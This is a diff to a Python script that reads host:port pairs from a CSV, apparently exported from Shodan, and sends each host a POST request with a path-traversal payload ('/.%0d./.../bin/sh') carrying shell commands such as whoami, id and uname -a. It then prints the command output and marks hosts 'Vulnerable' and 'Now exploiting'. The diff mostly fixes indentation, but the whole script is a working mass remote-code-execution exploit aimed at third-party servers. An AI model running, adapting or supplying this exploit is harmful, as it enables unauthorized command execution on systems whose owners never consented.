@@ -2,110 +2,106 @@ import csv
 
 import requests
 
-   
+
 
 def read_hosts_from_csv():
 
-  #This function return host_list
+    #This function return host_list
 
-  path = '/shodan-export.csv'
+    path = 'file.csv'
 
-  host_lists = []
 
-  with open(path, newline='') as csvfile:
+    host_lists = []
 
-  records = csv.reader(csvfile)
+    with open(path, newline='') as csvfile:
 
-  for record in records:
+        records = csv.reader(csvfile)
 
-  host_lists.append(record[0] + ":" + record[1])
+        for record in records:
 
-  return host_lists
+            host_lists.append(record[0] + ":" + record[1])
 
-  
+    return host_lists
 
-  
 
- if __name__ == '__main__':
+if __name__ == '__main__':
 
-  # proxy = {"http": "http://127.0.0.1:8080"}
+    # proxy = {"http": "http://127.0.0.1:8080"}
 
-  exp = "/.%0d./.%0d./.%0d./.%0d./bin/sh"
+    exp = "/.%0d./.%0d./.%0d./.%0d./bin/sh"
 
-  for host in read_hosts_from_csv():
+    for host in read_hosts_from_csv():
 
-  host, port = host.split(':')
+        host, port = host.split(':')
 
-  # Lazy Me
+        # Lazy Me
 
-  if "IP" not in host:
+        if "IP" not in host:
 
-  
 
-  # Debugging request
 
-  # req = requests.post('http://' + host + ":" + port+exp,
+            # Debugging request
 
-  # data='ifconfig 2>&1; echo "~~~~~~~~~"; id; echo "##########";', timeout=3,
+            # req = requests.post('http://' + host + ":" + port+exp,
 
-  # proxies=proxy)
+            # data='ifconfig 2>&1; echo "~~~~~~~~~"; id; echo "##########";', timeout=3,
 
-  try:
+            # proxies=proxy)
 
-  
+            try:
 
-  cmd = "whoami;id;uname -a"
 
-  print("[~] Trying ... " + host, port)
 
-  req2 = requests.post('http://' + host + ":" + port + exp,
+                cmd = "whoami;id;uname -a"
 
-  data='ifconfig 2>&1; echo "~~~~~~~~~~"; ' + cmd + ' ; echo "##########";',
+                print("[~] Trying ... " + host, port)
 
-  timeout=10) # change the timeout if needed
+                req2 = requests.post('http://' + host + ":" + port + exp,
 
-  
+                data='ifconfig 2>&1; echo "~~~~~~~~~~"; ' + cmd + ' ; echo "##########";',
 
-  # print (req2.status_code)
+                timeout=10) # change the timeout if needed
+                  
+                 # print (req2.status_code)
 
-  # print (req2.text)
+                # print (req2.text)
 
-  firstIndex = str(req2.text).find('~~~~~~~~~~')
+                firstIndex = str(req2.text).find('~~~~~~~~~~')
 
-  secondIndex = str(req2.text).find('##########')
+                secondIndex = str(req2.text).find('##########')
 
-  
 
-  if firstIndex:
 
-  print("#################### Vulnerable #######################")
+                if firstIndex:
 
-  print("[+] Now exploiting "+host)
+                    print("#################### Vulnerable #######################")
 
-  print(str(req2.text)[firstIndex + 10:secondIndex])
+                    print("[+] Now exploiting "+host)
 
-  
+                    print(str(req2.text)[firstIndex + 10:secondIndex])
 
-  # Host Detection
 
-  # time.sleep(10)
 
-  # req3 = requests.get(
+                    # Host Detection
 
-  # 'https://www.who-hosts-this.com/APIEndpoint/Detect?key'
+                    # time.sleep(10)
 
-  # '=YOUR_API_KEY&url=' + host)
+                    # req3 = requests.get(
 
-  # isp = json.loads(req3.text)
+                    # 'https://www.who-hosts-this.com/APIEndpoint/Detect?key'
 
-  # print("Hosted by:" + isp['results'][0]['isp_name'])
+                    # '=YOUR_API_KEY&url=' + host)
 
-  
+                    # isp = json.loads(req3.text)
 
-  print("#################### End #######################")
+                    # print("Hosted by:" + isp['results'][0]['isp_name'])
 
-  except:
 
-  # print('Err' + host)
 
-  pass
+                    print("#################### End #######################")
+
+            except:
+
+                # print('Err' + host)
+
+                pass
